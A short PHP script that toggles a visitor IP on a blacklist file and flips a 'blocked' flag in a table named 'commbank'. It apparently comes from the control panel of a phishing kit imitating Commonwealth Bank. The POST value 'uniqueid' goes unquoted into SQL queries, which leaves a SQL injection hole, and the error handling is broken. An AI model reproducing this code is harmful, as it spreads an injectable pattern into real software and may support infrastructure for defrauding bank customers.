<?php
require '../connection.php';

$ip = $_POST["ip"];
$uniqueid = $_POST["uniqueid"];

$check = mysqli_query($conn, "SELECT blocked FROM commbank WHERE uniqueid=$uniqueid");

if ($check) {
  $array = mysqli_fetch_array($check);

  if ($array[0] == 'true') {
    $contents = file_get_contents('../../blacklist/blacklist.txt');
    $contents = str_replace($ip, '', $contents);
    file_put_contents('../../blacklist/blacklist.txt', $contents);

    $query = mysqli_query($conn, "UPDATE commbank SET blocked='false' WHERE uniqueid=$uniqueid");
    if ($query) {
      echo json_encode(array(
        'status' => 'success'
      ));
    } else {
      echo json_encode(array(
        'status' => mysqli_error($query)
      ));
    }
    die(0);
  }

  if ($array[0] == 'false') {
    $myfile = file_put_contents('../../blacklist/blacklist.txt', $ip . PHP_EOL, FILE_APPEND | LOCK_EX);

    $query = mysqli_query($conn, "UPDATE commbank SET blocked='true' WHERE uniqueid=$uniqueid");

    if ($query) {
      echo json_encode(array(
        'status' => 'success'
      ));
    } else {
      echo json_encode(array(
        'status' => mysqli_error($query)
      ));
    }
    die(0);
  }
}

?>
